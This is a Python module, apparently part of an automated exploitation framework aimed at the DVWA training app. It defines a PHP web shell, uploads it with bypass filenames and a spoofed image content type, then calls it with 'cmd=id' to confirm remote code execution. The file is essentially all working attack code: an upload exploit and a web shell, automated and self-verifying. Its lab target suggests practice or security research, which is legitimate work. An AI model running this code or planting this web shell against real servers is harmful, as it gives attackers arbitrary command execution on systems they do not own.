"""Tier 2 file upload agent."""

from __future__ import annotations

import io
import re
from typing import Any

from agents.base_agent import BaseAgent
from agents.state_utils import (
    already_tried_payloads,
    append_error_marker,
    make_update,
    module_endpoint,
    normalize_security_level,
    prepare_agent_session,
)
from core.state import ExploitationState
from foundation.http_client import RequestTimeoutError, TransportError
from foundation.payload_library import PayloadLibrary
from foundation.session_manager import DVWASession
from foundation.verifier import Verifier


WEBSHELL_BYTES = b"<?php system($_GET['cmd']); ?>"


class UploadAgent(BaseAgent):
    module_name = "upload"

    def __init__(self) -> None:
        self.payloads = PayloadLibrary()
        self.verifier = Verifier()

    def check_prerequisites(self, state: ExploitationState) -> bool:
        level = normalize_security_level(state.get("security_level"))
        if level in {"medium", "high"}:
            return "admin_session_obtained" in set(state.get("confirmed_vulns", []))
        return True

    def run(self, state: ExploitationState) -> dict[str, Any]:
        score = 0
        confirmed: list[str] = []
        outcomes: list[str] = []
        tried_now: list[str] = []

        if not self.check_prerequisites(state):
            return make_update(
                state=state,
                module_name=self.module_name,
                score=score,
                tried_payloads=tried_now,
            )

        target_url = state.get("target_url", "")
        if not target_url:
            return make_update(
                state=state,
                module_name=self.module_name,
                score=score,
                tried_payloads=tried_now,
            )

        level = normalize_security_level(state.get("security_level"))
        endpoint = module_endpoint(state, self.module_name, "/vulnerabilities/upload/")
        payload_set = self.payloads.get(self.module_name, level)
        bypass_names = list(payload_set.bypass.get(level, []))
        already_tried = already_tried_payloads(state, self.module_name)

        candidate_names = ["shell.php"]
        for candidate in bypass_names:
            if candidate.startswith("shell"):
                candidate_names.append(candidate)

        session = DVWASession(target_url)
        try:
            ready, prep_notes = prepare_agent_session(session, level, require_login=True)
            tried_now.extend(prep_notes)
            if not ready:
                return make_update(
                    state=state,
                    module_name=self.module_name,
                    score=score,
                    tried_payloads=tried_now,
                )

            for filename in candidate_names:
                if filename in already_tried:
                    continue
                tried_now.append(filename)
                files = {
                    "uploaded": (
                        filename,
                        io.BytesIO(WEBSHELL_BYTES),
                        "image/jpeg",
                    )
                }
                response = session.post(
                    endpoint,
                    data={"Upload": "Upload", "MAX_FILE_SIZE": "100000"},
                    files=files,
                )
                body = response.text or ""

                if "uploaded" in body.lower():
                    score = max(score, 1)

                if "succesfully uploaded" in body.lower() or "successfully uploaded" in body.lower():
                    score = max(score, 3)
                    if "file_upload_confirmed" not in confirmed:
                        confirmed.append("file_upload_confirmed")

                    match = re.search(r"hackable/uploads/[\w.%\-]+", body)
                    uploaded_path = (
                        f"/{match.group(0)}"
                        if match
                        else f"/hackable/uploads/{filename.replace('%00', '')}"
                    )

                    verify = session.get(uploaded_path, params={"cmd": "id"})
                    verify_body = verify.text or ""
                    if self.verifier.regex_match(verify_body, [r"uid=\d+", r"gid=\d+"]).ok:
                        score = 4
                        confirmed = [*confirmed, "rce_achieved"]
                        outcomes = ["rce_achieved"]
                    break
        except (TransportError, RequestTimeoutError, RuntimeError, ValueError) as exc:
            append_error_marker(tried_now, "upload_runtime_error", exc)
        finally:
            session.close()

        return make_update(
            state=state,
            module_name=self.module_name,
            score=score,
            tried_payloads=tried_now,
            confirmed_vulns=confirmed,
            achieved_outcomes=outcomes,
        )


_AGENT = UploadAgent()


def upload_agent(state: ExploitationState) -> dict[str, Any]:
    return _AGENT.run(state)
